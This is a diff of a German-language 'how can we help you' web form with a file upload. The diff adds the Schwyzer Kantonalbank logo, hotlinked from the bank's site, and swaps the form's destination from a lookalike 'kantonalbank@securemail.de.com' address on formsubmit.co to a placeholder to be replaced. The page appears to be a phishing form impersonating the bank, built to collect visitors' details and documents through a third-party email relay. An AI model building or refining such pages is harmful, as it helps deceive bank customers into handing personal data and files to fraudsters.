@@ -17,15 +17,20 @@
 
     header {
       background-color: white;
-      padding: 40px 20px;
-      text-align: center;
+      padding: 20px;
+      display: flex;
+      align-items: center;
       border-bottom: 1px solid #e0e0e0;
     }
 
-    header h1 {
-      font-size: 36px;
+    .logo {
+      height: 40px;
+      margin-right: 20px;
+    }
+
+    .header-title {
+      font-size: 24px;
       font-weight: 700;
-      margin: 0;
     }
 
     main {
@@ -67,7 +72,7 @@
       color: white;
       padding: 14px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       font-weight: 600;
       font-size: 16px;
       cursor: pointer;
@@ -83,8 +88,12 @@
     }
 
     @media (max-width: 600px) {
-      header h1 {
-        font-size: 28px;
+      .header-title {
+        font-size: 20px;
+      }
+
+      .logo {
+        height: 32px;
       }
     }
   </style>
@@ -92,11 +101,12 @@
 <body>
 
   <header>
-    <h1>Wie können wir Ihnen helfen?</h1>
+    <img src="https://www.szkb.ch/ResourcePackages/CorporateWebsite/assets/dist/img/szkb-logo.svg" alt="SZKB Logo" class="logo">
+    <div class="header-title">Wie können wir Ihnen helfen?</div>
   </header>
 
   <main>
-    <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
+    <form action="https://formsubmit.co/your@email.com" method="POST" enctype="multipart/form-data">
       <!-- Replace with your email above -->
 
       <label for="name">Ihr Name</label>
